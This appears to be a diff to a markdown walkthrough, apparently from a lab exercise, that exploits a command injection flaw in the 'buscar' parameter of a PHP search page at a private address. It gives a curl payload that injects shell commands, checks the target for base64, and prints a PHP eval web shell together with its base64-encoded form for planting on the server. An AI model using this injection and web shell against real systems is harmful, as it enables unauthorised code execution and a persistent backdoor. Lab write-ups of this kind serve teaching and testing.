@@ -89,6 +89,10 @@ mysqli_close($conn);
 
 ## Payload
 ```
+The following page has a command injection vulnerability in the buscar parameter
+
+http://192.168.50.52/site/busque.php?buscar=
+
 curl -X GET "http://192.168.50.52/site/busque.php?buscar=echo%20\"hacker\"%20>%20hacker.txt"
 ```
 
@@ -96,7 +100,13 @@ curl -X GET "http://192.168.50.52/site/busque.php?buscar=echo%20\"hacker\"%20>%2
 ```
 <?php if(isset(\$_POST['cmd'])){print_r(@eval(\$_POST['cmd']));} ?>
 
-After bases64 encoding
+Checking whether the machine has base64 
+http://192.168.50.52/site/busque.php?buscar=which%20base64
+
+we get /usr/bin/base64
+
+
+Now we base64 encode the payload
 PD9waHAgaWYoaXNzZXQoJF9QT1NUWydjbWQnXSkpe3ByaW50X3IoQGV2YWwoJF9QT1NUWydjbWQn
 XSkpO30gPz4K
 
